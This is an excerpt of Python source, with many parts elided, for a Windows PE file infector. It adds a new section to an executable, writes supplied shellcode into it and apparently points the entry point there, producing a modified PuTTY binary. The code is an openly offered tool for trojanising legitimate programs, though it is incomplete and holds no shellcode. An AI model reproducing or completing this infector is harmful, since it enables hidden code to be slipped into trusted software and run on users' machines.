...
class PeInfection:
    def __init__(self, filename, infected_file_name):
        ...
        self.old_ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint.to_bytes(
            4, "little")
    ...
    def add_section(self):
        ...
        self.pe.set_dword_at_offset(
            self.new_section_offset + 8, self.virtual_size)
        self.pe.set_dword_at_offset(
            self.new_section_offset + 12, self.virtual_offset)
        self.pe.set_dword_at_offset(
            self.new_section_offset + 16, self.raw_size)
        self.pe.set_dword_at_offset(
            self.new_section_offset + 20, self.raw_data_offset)
        self.pe.set_bytes_at_offset(self.new_section_offset + 24, 12 * b"\x00")
        self.pe.set_dword_at_offset(
            self.new_section_offset + 36, characteristics)
    ...
    def infect(self, shellcode):
        ...
        # Insert shellcode
        infectpe.set_bytes_at_offset(
            self.raw_data_offset, shellcode + return_code)
        # Set new EP
...
if __name__ == "__main__":
    ...
    infected_file_name = path.join(
        path.dirname(__file__), "test/putty-moded.exe")
